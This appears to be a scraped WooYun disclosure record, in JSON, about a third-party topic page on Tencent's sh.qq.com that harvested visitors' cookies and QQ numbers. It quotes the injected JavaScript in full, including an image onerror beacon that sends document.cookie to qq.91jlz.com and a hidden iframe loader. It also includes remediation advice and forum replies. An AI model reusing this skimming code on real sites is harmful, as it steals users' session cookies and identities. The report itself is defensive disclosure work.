{"id": 6727, "wybug_id": "wooyun-2013-044466", "wybug_title": "利腾讯大申网专题放置JS盗取用户cookies获取QQ", "wybug_corp": "腾讯", "wybug_author": "hijax", "wybug_date": "2013-11-29 21:57", "wybug_open_date": "2014-01-13 21:58", "wybug_type": "钓鱼欺诈信息", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向公众公开  简要描述： 大申网专题审核不严，添加JS获取用户COOKIE，进而获取访客QQ号在内的COOKIE信息 详细说明：  利用购买的大申网（sh.qq.com）的专题上面放置JS，来获取访客COOKIES信息，进而提取访客QQ号，进行针对性营销。1.大申网上添加JS，获取cookiessh.qq.com/zhuanti/adv/xgl.htm\n\n\ndocument.write(\"<div style='display:none;'><img style=\\\"visibility:hidden\\\" onerror=\\\"this.src='http://qq.91jlz.com/?'+escape(document.cookie);\\\" src=\\\"http://w\\\" /></div>\");\n2.在网站中隐身加载加有cookie盗取的专题页：\n;(function () {\tvar f = document.createElement('iframe'), a={id:'SKg-Ping',width:0, height:0, frameborder:0, scrolling:'no', onload:'var f=document.getElementById(\"SKg-Ping\"); try{f.parentElement.removeChild(f);}catch(e){} delElement();'};\tfor(k in a) f.setAttribute(k, a[k]);\tf.src='http://sh.qq.com/zhuanti/adv/xgl.htm?cj1odHRwJTNBJTJGJTJGYXh6LmZkbms5MS5jb20lMkYmZD1mZG5rOTEuY29tJnQ9JUU1JThDJUJCJUU5JTk5JUEyJUU0JUJCJThCJUU3JUJCJThELSVFNCVCOCU4QSVFNiVCNSVCNyVFNSVBNCU4RCVFNSVBNCVBNyVFNyU5RiVBRSVFNSVCMCU4RiVFNyU5NyU4NyVFNSU4QyVCQiVFOSU5OSVBMiZpZD0zNiZwPWh0dHAlM0ElMkYlMkZheHouZmRuazkxLmNvbSUyRnpqZmQlMkZ5eWpzJTJGJnRva2VuPTBmODdmZDc1NDQ2NDhkYTIzZjlhOTUzZjBiNTg3Yzgw';\tdocument.body.appendChild(f);\tdelete f;    window.delElement = function(){        var ct = setInterval(function(){            if((typeof LR_sid === 'string')&&(LR_sid.length>20)){                window.clearInterval(ct);                var f = document.createElement('script');                f.src='http://qq.91jlz.com/cnzz.php?sid='+ LR_sid +'&r=0f87fd7544648da23f9a953f0b587c80';                document.body.appendChild(f);                delete f;            }        },2000);    }})();\n有针对性的获取访客的IP,地区，QQ号，搜索关键词，访问页面地址，停留时间，这样就是一份精准的针对性的营销方式了。当然盗取的cookies还有其它啥用途，暂未有机会测试。\n\n   漏洞证明：  检查这个专题的JS即知：http://sh.qq.com/zhuanti/adv/xgl.htm\n\n   修复方案：  1.加强对合作伙伴的审核2.静态专题没必要放那么cookie或httponly3.静止静态页被iframeset 'X-Frame-Options' to 'SAMEORIGIN'   版权声明：转载请注明来源 hijax@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-01 15:01 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-29 22:15 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  围观,标题好屌!    \n     2013-11-29 22:19 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  围观,标题好屌!    \n     2013-11-29 23:26 |    \t\t念念不忘 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 求基友)\t\t \n  \t利腾讯大申网？？    \n     2013-11-29 23:29 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  用    \n     2013-11-29 23:48 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  只能加了个获取qq号码。。    \n     2013-11-30 08:09 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @念念不忘 @忆苦思甜 @浅蓝 看懂了没。。。。获取QQ 不是获取cookie 只是获取了别人的QQ号 那有个吊用 - -     \n     2013-11-30 09:21 |    \t\t冻心 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 爱wooyun  爱生活！)\t\t \n  楼主，你太单纯了，楼下全是我小号，不信我给你回复几个看看    \n     2013-11-30 10:24 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  目测无影响    \n     2013-11-30 13:11 |    \t\t苦战 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 人称苦战？乃南方蛮荒之人！相平，谓正不如...)\t\t \n  我不是七楼小号    \n     2013-11-30 15:17 |    \t\tcnhello \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小菜一枚，学习中。。。)\t\t \n  我不是七楼小号    \n     2013-11-30 19:04 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  @冻心 这是你大号？    \n     2013-12-01 09:01 |    \t\t花生^_^ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 加强学习~~)\t\t \n  我不是七楼小号    \n     2013-12-01 16:28 |    \t\t麻花藤 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  我不是七楼小号    \n     2014-01-13 23:13 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  我不是七楼小号     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}